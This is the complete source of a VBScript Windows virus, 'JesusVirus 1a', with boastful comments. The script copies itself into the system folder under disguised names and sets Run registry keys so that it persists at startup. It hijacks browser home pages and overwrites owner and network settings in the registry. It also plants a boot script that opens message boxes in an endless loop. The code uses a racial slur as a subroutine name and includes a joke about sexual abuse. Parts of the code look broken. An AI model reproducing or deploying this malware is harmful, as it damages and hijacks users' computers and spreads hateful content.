On Error Resume Next
Rem
Rem
Rem Plain Pain you might regain and complain
Rem Jesus rolled me a doobie
Rem This is NOT a Love Bug Varient
Rem  _____
Rem |     \       |    
Rem |      \      |   
Rem |_____ /      |  
Rem |      \      | 
Rem |      /      |
Rem |_____/oot    |______eg
Rem Yeah, We're From the Philipenes ... Or something like that
Rem
Rem
shit=file.ReadAll
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set c = fso.GetFile(WScript.ScriptFullName)
Set rootdrive = (dirwin)
c.Copy(dirsystem&"\JesusNews.doc.vbs")
c.Copy(dirsystem&"\MSIEUPD32.vbs")
c.Copy(rundir&"\MSIEUPD3211.vbs")
sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Rem BAAAAM
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.JesusLoveMe.net/"
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","www.JesusSaysDIE.com"
regcreate "HKEY_USERS\.DEFAULT\Control Panel\Appearance\Schemes\JesusIsLord","00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
regcreate "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\@","Jesus Lives Here"
regcreate "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InfoTip","I'm Jesus's ash tray"
regcreate "HKEY_CURRENT_USER\RemoteAccess\Addresses\JesusnetISP","00 01 00 00 00 00 00 00 00 00 00 00 00 00 00"
regcreate "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP\Workgroup","BibleStudy"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Telnet\Machine1","www.JesusIsLordAndMaster.com"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EmailName","Jesus@heavin.bam"
regcreate "HKEY_CURRENT_USER\Software\Mirabilis\ICQ\DefaultPrefs\Default Server Host","icq.JesushatesICQ.com"
regcreate "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\Main\Autoload Home Page","yes"
regcreate "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\Main\Home Page","http://www.JesusSaysYouSuck.com"
regcreate "HKEY_CURRENT_USER\Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Login\Screen Name","JesusVirus1a"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info\DefCompany","Jesus-soft"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info\DefName","Jesus Christ, Son of god."
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Jesus Christ"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","HeavinSoft Toolz"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Telephony\Country List\1\Name","United States of Rock and Roll"

Rem Make Crappy HTML file on Desktop
Set html=fso.CreateTextFile(dirwin&"\desktop\Jesus.html")
html1= "<body bgcolor=@-@Black@-@ text=@-@Red@-@ link=@-@Green@-@>"
html2= "<center><h2>JesusVirus 1a.</h2><br></center>"
html3= "<small><center>Bootleg Programing Inc.</small></center>"
html4= "<br><br><center>Compuer status: <blink><U>INFECTED</U></blink><br>This <b>VIRUS</b> isnt dangerous to your files, just to your sanity."
burn1=replace(html1,"@-@","""")
burn4=replace(html4,"@-@","""")
html.WriteLine burn1
html.WriteLine html2
html.WriteLine html3
html.Writeline burn4
Rem Line 74
Rem Make the randomizing Boot Up Raper!
Set whoa=fso.CreateTextFile(dirsystem&"\Msconfig.vbs")
whoa0 = "Randomize"
whoa1 = "poo = Int((4 * Rnd) + 1)"
whoa2 = "if poo = 2 then"
whoa3 = "call nigger()"
whoa4 = "end if"
whoa5 = "sub nigger()"
whoa6 = "Msgbox @-@Jesus Eats People@-@"
whoa7 = "Msgbox @-@Thats why we love him@-@"
whoa8 = "Msgbox @-@Let Jesus into your Heart@-@"
whoa9 = "Msgbox @-@Jesus told me to touch you there@-@"
whoa10 = "call nigger"
whoa11 = "end sub"
bamm6=replace(whoa6,"@-@","""")
bamm7=replace(whoa7,"@-@","""")
bamm8=replace(whoa8,"@-@","""")
bamm9=replace(whoa9,"@-@","""")
whoa.WriteLine whoa0
whoa.WriteLine whoa1
whoa.WriteLine whoa2
whoa.WriteLine whoa3
whoa.WriteLine whoa4
whoa.WriteLine whoa5
whoa.WriteLine bamm6
whoa.WriteLine bamm7
whoa.WriteLine bamm8
whoa.WriteLine bamm9
whoa.WriteLine whoa10
whoa.WriteLine whoa11
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Msconfig",dirsystem&"\Msconfig.vbs"

Rem Make the virus run at start up.
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSIEUPD32",dirsystem&"\MSIEUPD32.vbs"

Rem This file is to verify that Virus was installed on computer
set susej=fso.CreateTextFile(dirsystem+"\susej.dll")
susej.write "Yes it was. But i think i have.No one will ever find this. Or will they? Tucked away all up in a place where no one, with the right mind, would mess with me HeAHAHfsdhasdofkjh adogj"
susej.close

Rem This will make the 'Shut down' screen appear durring start up. WHAT THE HELL AM I THINKING??????
Set whatthe = fso.GetFile(dirwin&"\logos.sys")
whatthe.Copy(rundir&"\logo.sys")